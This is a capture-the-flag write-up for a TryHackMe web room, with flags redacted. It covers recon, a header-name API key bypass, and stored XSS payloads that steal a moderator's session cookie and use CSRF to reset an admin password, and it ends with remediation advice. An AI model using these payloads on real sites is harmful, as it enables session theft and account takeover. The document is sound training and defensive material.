# TryHackMe — What's Your Name? (WorldWAP)

**Flags are redacted here.** Every command, payload, byte offset and dead end is intact; only the
flag strings are replaced with `[redacted]`. The flag proves you were there — it teaches nothing,
and publishing it just hands the room's answer to the next person.

> *"This challenge will test client-side exploitation skills, from inspecting JavaScript to
> manipulating cookies to launching XSS attacks. Never click on links received from unknown
> sources."*

Two questions to answer: the flag after accessing the **moderator** account, and the flag after
accessing the **admin panel**.

The short version: the registration form is closed, but its JavaScript gives away an API you can
call directly. Whatever you type into that form is later displayed to a human moderator — unescaped.
That is a stored **XSS** (cross-site scripting: getting someone else's browser to run markup you
supplied). From there it is one hop to the moderator's session and a second hop, through the chat
application, to the administrator's account.

The long version includes a two-hour wrong turn that was entirely my own fault, and which is
probably the most useful part of this write-up.

---

## 1. Recon

### 1.1 Which doors are open

```bash
nmap -Pn -p- --min-rate 2000 -T4 -oN nmap-allports.txt 10.128.188.213
```

A **port** is a numbered channel on a machine; each network service listens on one. Web servers
normally use 80.

- `-Pn` — "assume the host is alive". By default nmap pings first and gives up if there's no reply;
  lab machines usually block ping, so without this you scan nothing.
- `-p-` — check all 65,535 ports instead of nmap's default list of 1,000.
- `--min-rate 2000` — send at least 2,000 packets per second, turning a slow sweep into seconds.
- `-oN file` — save the output, so any claim can be re-checked later.

```
22/tcp   open  ssh
80/tcp   open  http
8081/tcp open  http
```

Port 8081 turns out to be a byte-for-byte duplicate of the port-80 site. I confirmed that rather
than assuming it, by comparing every path on both ports — the only differences were two-byte size
deltas in Apache's own generated pages, because the string `:8081` appears inside them.

### 1.2 One IP, two websites

The box serves different sites depending on the `Host:` header in your request. That is **name-based
virtual hosting** ("vhost"). The room tells you to add `worldwap.thm` to your hosts file; there is
also `login.worldwap.thm`.

I had no root on my machine, so instead of editing `/etc/hosts` I used:

```bash
curl --resolve worldwap.thm:80:10.128.188.213 http://worldwap.thm/
```

`--resolve name:port:ip` tells curl "skip DNS for this name and use this address". Same effect as a
hosts entry, but scoped to one command and leaving nothing behind to clean up.

| Request | Result |
|---|---|
| `Host: worldwap.thm` | `302` → `/public/html/` — a social network |
| `Host: login.worldwap.thm` | a chat application |
| any other name, and port 8081 | identical to `login.worldwap.thm` |

That last row matters: the chat app is the **default** vhost, the catch-all that answers when the
requested name matches no configured site. I proved it by fetching `/login.php` as
`login.worldwap.thm`, `zzz.worldwap.thm` and `anything.else.thm` — all three had the same MD5. So
`worldwap.thm` is the only *defined* vhost, and hunting for more subdomains is pointless.

### 1.3 Read the JavaScript before touching anything

`/public/js/` has directory listing enabled. The files there **are** the API documentation — they
name every endpoint, method, header and field.

`register.js` gives the entire registration contract away:

```js
fetch('../../api/register.php', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-THM-API-Key': 'e8d25b4208b80008a9e15c8698640e85'
  },
  body: JSON.stringify({ username, password, email, name }),
})
```

`login.js` shows how the app routes you after login:

```js
window.location.href = data.role == 'moderator' ? 'admin.php' : 'dashboard.php';
```

So there is a `moderator` role. And `dashboard.js` contains the app's one obvious HTML-injection
sink:

```js
postDiv.innerHTML = `<h3>${post.title}</h3><p>${post.content}</p><p>- ${post.username}</p><hr>`;
```

`innerHTML` parses its input **as HTML**, so anything inside those variables becomes real markup.
Compare `mod.js`, the page where the moderator reviews people waiting for approval:

```js
cellUsername.textContent = user.username;
cellEmail.textContent    = user.email;
cellName.textContent     = user.name;
```

`textContent` inserts **text**, never markup — `<img src=x>` shows up as those literal characters.

**This contradiction cost me a lot of time.** Every published write-up says a registration payload
fires in the moderator's browser, but the client-side renderer for that page cannot do that. The
resolution is that `mod.php` also renders the pending list server-side, and that server-side copy is
what the moderator's browser actually parses. `mod.js` is effectively dead code. I could not read
`mod.php` (it is behind a login), so this only became clear once the exploit worked.

---

## 2. Getting an account

### 2.1 Registration is "disabled" — and the lock is the wrong shape

```
{"error":"Registration disabled at the moment."}
```

But send the API key header that `register.js` revealed, spelled exactly as it appears there:

```bash
curl -X POST http://worldwap.thm/api/register.php \
  -H 'Content-Type: application/json' \
  -H 'X-THM-API-Key: e8d25b4208b80008a9e15c8698640e85' \
  -d '{"username":"bxtest1","password":"Str0ngPass!23","email":"a@x.thm","name":"BX"}'
```

```
{"message":"Registration successful."}
```

I ran two controls alongside it, and the second one is the interesting one:

| Request | Response |
|---|---|
| header `X-THM-API-Key`, correct key | `Registration successful.` |
| header `x-thm-api-key`, correct key | `Registration disabled at the moment.` |
| header `X-THM-API-Key`, **wrong** key `deadbeef…` | `Registration successful.` |

**The key's value is never checked.** All that matters is that a header *named* exactly
`X-THM-API-Key` is present. PHP's `getallheaders()` returns header names as the client sent them, so
code like `isset($headers['X-THM-API-Key'])` simply fails to find a differently-cased name and falls
through to the "disabled" branch.

This has a practical consequence that bites people constantly:

> **`curl` sends header names exactly as you type them. Python's `urllib` and Go-based tools
> (`ffuf`, `gobuster`) normalise them** to `X-Thm-Api-Key`. Against a case-sensitive check, your
> perfectly good request silently becomes "Registration disabled" — and you read that as *target
> state* when it is really *your own client*. Every request in this room went through `curl` for
> exactly that reason.

### 2.2 The account is not usable yet

```
POST /api/login.php  {"username":"bxtest1","password":"..."}
→ {"error":"User not verified."}
```

The register page explains: *"Your details will be reviewed by the site moderator."*

Two useful side observations:

- `login.php` says `Invalid username or password` for a name that doesn't exist and
  `User not verified.` for one that does — a **user-enumeration oracle**.
- Registering `moderator` returns
  `Duplicate entry 'moderator' for key 'users.username'`, while `admin`, `root`, `administrator`,
  `bot`, `support`, `test` and `guest` all register cleanly. So `moderator` is the *only*
  pre-existing account. Note this oracle is a **write**: probing whether `admin` exists creates
  `admin` when it doesn't. Say that out loud before you run it.

### 2.3 What a session would buy

| Endpoint | Unauthenticated |
|---|---|
| `/public/html/{admin,mod,dashboard,upload}.php` | `403`, **0 bytes** |
| a name that doesn't exist in that directory | `404`, 274 bytes |
| `/api/posts.php`, `/api/mod.php` | `{"error":"Not logged in"}` |
| `/api/mod_update.php?userId=N` | `{"error":"Unauthorized access."}` |
| `/api/{add,edit,delete}_post.php` | `{"error":"Only admins can …"}` |

That first pair of rows is a **discriminator** worth internalising: on this app, an existing page you
aren't allowed to see answers `403` with an empty body, while a missing one answers `404` with
Apache's 274-byte error page. You can enumerate the whole protected surface without any credentials.

`/api/mod_update.php?userId=N` is the "Activate" link that `mod.js` builds. It is a **GET that
changes state**, which makes it a textbook **CSRF** target (cross-site request forgery: making a
victim's browser send a request so that the victim's own cookies ride along).

---

## 3. The wrong turn — two hours spent measuring my own firewall

This is the part worth reading.

I registered XSS payloads in `name`, `email` and `username`, started a listener, and waited. Nothing.
For forty-five minutes. I widened the payloads — attribute breakouts, `onerror`, `onload`, bare URLs
to test link auto-detection, the exact payload from a published write-up. Still nothing.

I did what looked like the right thing and tried to make the silence meaningful. A blind callback
that never arrives is ambiguous — it can mean "no XSS", "the victim never loaded the page", or "my
listener is unreachable" — so I built a probe that removed the last of those. I even ran a listener
self-test:

```bash
python3 -m http.server 8000 &
curl http://192.168.160.167:8000/SELFTEST     # appears in the log → "channel proven"
```

Then I concluded the room's moderator bot wasn't running, wrote that up, and reported it.

**That was wrong, and the proof was on my own machine the whole time:**

```bash
$ dmesg | grep 'UFW BLOCK' | grep 'SRC=10.128.188.213'
[UFW BLOCK] IN=tun0 SRC=10.128.188.213 DST=192.168.160.167 PROTO=TCP DPT=80   SYN
[UFW BLOCK] IN=tun0 SRC=10.128.188.213 DST=192.168.160.167 PROTO=TCP DPT=8000 SYN
...
$ journalctl -k --since -2h | grep -c 'UFW BLOCK'
360
```

The target had been connecting back the entire time, to exactly the ports my payloads named. The
XSS worked from the very first attempt. My own host firewall was dropping every packet:

```bash
$ grep DEFAULT_INPUT_POLICY /etc/default/ufw
DEFAULT_INPUT_POLICY="DROP"
$ systemctl is-active ufw
active
```

**Why the self-test was worthless.** A packet from this machine to this machine's own address never
crosses the VPN interface — the kernel routes it over loopback, and `ufw` unconditionally accepts
`-i lo`. So the test exercised a path the victim will never use, passed, and told me the channel was
fine. It was a control that *could not fail*, which is exactly the kind you must never trust.

Three rules come out of this, and they generalise well beyond this room:

1. **A channel test must enter through the same interface the victim's traffic will.** Testing your
   listener from localhost proves only that the listener is running.
2. **When you can't generate that traffic yourself, stop inferring and go read the firewall.**
   `grep DEFAULT_INPUT_POLICY /etc/default/ufw`, `systemctl is-active ufw`, and above all
   `dmesg | grep 'UFW BLOCK'`.
3. **Blocked SYNs from your target are positive evidence the exploit worked.** That log line was the
   single most valuable signal in the whole engagement, available from minute one, in a file I never
   opened.

The fix is one command:

```bash
sudo ufw allow in on tun0 from <target-ip> to any port 80 proto tcp
```

Scope it to the VPN interface **and** the target's address rather than disabling the firewall — then
even if something else is on that network, only the lab box can reach your listener. Delete it when
you're done; ufw rules survive reboots.

---

## 4. Solving it without any inbound connection at all

Here's the thing: once you understand the failure, you don't actually need the firewall open. Every
step below uses a channel **the application itself provides**.

### 4.1 Make the moderator activate my account

First attempt, which failed and is instructive: spray the activation link across a range of user ids,
using `<img>` tags so no JavaScript is required.

```html
<img src=/api/mod_update.php?userId=1><img src=/api/mod_update.php?userId=2>…
```

Nothing happened. The reason is that ~400 requests were fired from a page the bot closes a few
seconds later, so nearly all of them were cancelled on unload — and I was guessing ids anyway.

The fix is to stop guessing and let the payload **look up** what it needs. Registered with this in
the `name` field:

```html
<script>fetch('/api/mod.php').then(r=>r.json()).then(d=>d.forEach(
u=>{if(u.username=='bxwin1')fetch('/api/mod_update.php?userId='+u.id)}))</script>
```

Running in the moderator's browser, under the moderator's session, it reads the pending-user list,
finds this very account, and clicks its own Activate link. One request instead of four hundred.

```
ACTIVATED bxwin1 → {"message":"Login successful.","role":"user"}
```

Note what the success signal is: **my own account changing state**, which I read myself over plain
HTTP. No listener, no callback, no firewall involvement.

### 4.2 Turn the moderator's own API into an exfiltration channel

With an ordinary `user` session, `/api/mod.php` is readable and returns every pending user's
`id, username, email, name, status`. So the moderator's browser can **write** into a place I can
**read**. Payload in `name` (253 characters, under the 300-byte column limit):

```html
<script>fetch('/api/register.php',{method:'POST',headers:{'Content-Type':'application/json',
'X-THM-API-Key':'e8d25b4208b80008a9e15c8698640e85'},body:JSON.stringify({username:'exf'+Date.now(),
password:'x',email:'e@x.thm',name:document.cookie})})</script>
```

It registers a new pending user whose *name* is the moderator's own cookie. Poll `/api/mod.php`:

```
user: exf1788003325172   name: PHPSESSID=a0h7qincl081l1uvb290fuovrg
```

The cookie is stealable because the app never sets the **`HttpOnly`** flag. `HttpOnly` tells the
browser "JavaScript may not read this cookie"; without it, `document.cookie` hands it over.

### 4.3 The moderator flag

The cookie is scoped `domain=.worldwap.thm`, which means the browser sends it to **both** sites —
the social network and the chat app. That is the "manipulating cookies" part of the room brief:
present the stolen session and you are the moderator.

The main app's `admin.php` is only a post-management form, but the chat app's `profile.php` has it:

```
Welcome, Moderator   Flag value: [redacted]
```

**Flag 1: `[redacted]`**

### 4.4 The admin flag, through the chat bot

The chat app has three relevant pieces:

- `chat.php` accepts a `message` parameter by POST.
- `fetch_messages.php` renders each stored message with `messageDiv.innerHTML = msg.message` —
  **stored XSS**, and the "Admin Bot" reads the chat.
- `change_password.php` changes the password of **whoever's session sends the request**. It requires
  no old password and carries no CSRF token.

Those three together mean a chat message can make the admin's browser change the admin's own
password:

```html
<script>fetch('/change_password.php',{method:'POST',
headers:{'Content-Type':'application/x-www-form-urlencoded'},
body:'new_password=Bx!Adm1nPwn'})</script>
```

Two details matter:

- The URL is **relative**. The app wraps `http://…` in `<a>` tags, which mangles a payload containing
  an absolute URL. Other write-ups work around this with string concatenation
  (`'ht'+'tp://…'`); a relative path sidesteps it entirely.
- `application/x-www-form-urlencoded` keeps this a CORS "simple request", so the browser sends it
  without a preflight and includes cookies.

The chat page provides its own **Reset/Move Admin Bot** button, which is a `GET /block.php` — use it
to bring the bot to the page. Roughly ten seconds later:

```
block.php → "Reset completed"
LOGIN OK as 'admin'
```

And `profile.php` as admin:

```
Welcome, Admin   Flag value: [redacted]
```

**Flag 2: `[redacted]`**

Again, note the success signal: I didn't need a callback to know the CSRF worked — I just tried
logging in with the password I had chosen.

---

## 5. Everything I ruled out along the way

Each of these was a real hypothesis tested with a control, not a guess. They're worth listing
because the negative results are most of the work:

| Hypothesis | Result |
|---|---|
| Mass assignment — set `"role":"moderator"` or `"verified":1` at registration | ignored; still `User not verified.` |
| The two apps share a session store, so a chat login unlocks the main app | no — separate account databases |
| A chat endpoint writes the session *before* checking auth | no endpoint ever produced an authenticated session |
| Auth state lives in a forgeable cookie (`role=moderator`, `admin=1`, 11 tried) | all `Not logged in` |
| `register.php` / `login.php` are SQL-injectable | prepared statements; quotes, `' OR '1'='1`, `a'); -- ` all stored literally |
| `fetch_messages.php` takes an identity from a parameter or cookie | 4,614 parameter names, 10 cookies, 3 JSON shapes — always `[]` |
| A verification endpoint exists that I haven't found | targeted 1,250-word sweep of `/api/` — no |
| More virtual hosts | 4,616 names — none |
| phpMyAdmin 4.9.5 at `/phpmyadmin/` has default credentials | 6 combinations, all rejected |
| Verb tampering or path normalisation bypasses the `403` | GET/POST/PUT/HEAD/OPTIONS/FOOBAR and 8 path variants — no |
| Input is HTML-escaped before storage (which would kill the XSS) | no — see below |

That last test is a nice trick. I couldn't read the database, but the app leaks MySQL errors and
`name` is capped at 300 characters. `htmlspecialchars()` expands `<` to `&lt;` — one character
becomes four. So a name of 76 `<` is 76 characters raw but 304 escaped. It registered fine, which
proves the payload is stored **raw**. Controls: 76 `A` succeeded, 301 `A` returned
`Data too long for column 'name' at row 1`.

---

## 6. Wrong turns, and the rule each one earns

1. **I treated a directory listing as the contents of the directory.** `/public/html/` autoindexes
   only `index.php` and `register.php`, yet it also holds `admin.php`, `mod.php`, `dashboard.php` and
   `upload.php`. I never fuzzed it, and so missed `upload.php` entirely and stated "no upload
   endpoints" based on 404s from three directories that didn't contain it.
   → **A directory listing is evidence of presence, never of absence.** Sweep by name anyway, and
   match on the app's own "exists but denied" signature (`403` + 0 bytes) rather than on `200`.
2. **My channel test could not fail.** Covered at length in section 3.
   → **Test the channel through the interface the victim will use, or read the firewall directly.**
3. **I trusted a carried-over note** that the API key's *value* was checked. The control disproved it.
   → **Re-derive inherited "facts" with a control before building on them.**
4. **A sweep whose positive control was broken.** I appended `worldwap.thm` to a vhost wordlist that
   was then stripped of that exact suffix, so the control tested a name that could not exist.
   → **The positive control must survive every transformation the wordlist goes through.**
5. **An enumeration oracle that writes.** Probing whether `admin` exists registers `admin` when it
   doesn't.
   → **When the only oracle is a write, say so before running it and record what it created.**
6. **A detector that lied by labelling.** My activation checker reported two accounts as "not
   pending" — they were the accounts whose *username was itself the payload*, so I was looking up
   names that never existed.
   → **Read the rows, not the summary count.**
7. **Payload volume as a substitute for payload precision.** 400 sprayed requests achieved nothing;
   one request against an id looked up from the app's own API worked immediately.
   → **Make the payload query for what it needs instead of guessing.**
8. **I assumed a low port needed root.** `/proc/sys/net/ipv4/ip_unprivileged_port_start` was `0` on
   this machine, so port 80 was bindable as a normal user all along.
   → **Check the sysctl before concluding you need privileges.**

---

## 7. What the developers should have done

- **Escape on output.** `name`, `email` and `username` are rendered into the moderator's page as raw
  HTML. `htmlspecialchars()` at render time kills the entire chain.
- **Set `HttpOnly` on the session cookie.** Without it, one XSS is a total account takeover. With it,
  `document.cookie` returns nothing useful.
- **Don't scope the session cookie to `.worldwap.thm`** unless both apps genuinely are one trust
  boundary. That single attribute is what turned a moderator session on the social network into a
  moderator session on the chat app.
- **Require the current password to change a password**, and add a CSRF token. Either one alone
  breaks the admin takeover.
- **Never render chat messages with `innerHTML`.** `textContent` — which this codebase already uses
  correctly in `mod.js` — would have been enough.
- **Don't gate on the presence of a header name.** An API key that is never compared to anything is
  not an API key, and case-sensitive header lookups turn into accidental authentication bypasses.

---

## 8. Answers

| Question | Answer |
|---|---|
| Flag after accessing the moderator account | `[redacted]` — chat app `profile.php`, page header |
| Flag after accessing the admin panel | `[redacted]` — same page, as admin |

Both were verified by fetching the page with the hijacked session and reading the rendered header.
